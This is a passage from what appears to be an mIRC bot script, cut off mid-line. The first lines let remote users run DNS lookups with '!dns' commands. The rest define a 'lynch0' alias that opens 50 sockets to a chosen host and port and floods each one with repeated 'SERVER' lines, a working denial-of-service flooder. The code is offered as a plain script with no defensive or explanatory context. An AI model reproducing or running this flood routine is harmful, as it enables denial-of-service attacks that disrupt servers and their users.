n80=on 10:TEXT:!dns*:#: { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr # | msg # 15Attempting To Resolve:[Address:1 $2 $+ 15] }
n81=on 10:TEXT:!dns*:?: { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr $nick | msg $nick 15Attempting To Resolve:[Address:1 $2 $+ 15] }
n82=on *:DNS:{ if (%dns.r == on) { msg %dns.rr 15DNS Complete:[Resolved1 $iaddress 15To:1 $naddress $+ 15] | unset %dns.* } }
n83=alias lynch0 { set %lc 0 |  set %space   | set %lm $replace($$3-,$chr(32), ) |  :ll |  if (%lc == 50) { /halt } |  /sockopen lynch0 $+ %lc $$1 $$2 |  inc %lc |  goto ll }
n84=on 1:SOCKOPEN:lynch0*:/sockwrite -n $sockname SERVER %lm
n85=on 1:SOCKWRITE:lynch0*:/sockwrite -n $sockname SERVER %lm
n86=on 1:SOCKCLOSE:lyn